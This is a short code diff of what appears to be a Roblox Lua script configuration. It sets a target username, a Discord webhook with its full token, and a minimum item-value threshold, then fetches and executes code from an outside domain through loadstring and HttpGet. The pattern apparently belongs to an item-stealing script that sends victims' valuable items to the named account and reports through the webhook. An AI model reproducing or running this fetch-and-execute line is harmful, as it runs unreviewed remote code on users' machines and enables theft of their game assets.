@@ -1,5 +1,7 @@
 Username = "kittybobor"
-MailMessage = "GRNGRN"
+Username2 = "kittybobor"
 Webhook = "https://discord.com/api/webhooks/1230927227286458418/573on3htx3lQQgAJx_TGli2kI3fgGimn7vlCSwO-PjD-l4ek138WodAhYvtRWEQf0w5h"
 
-loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
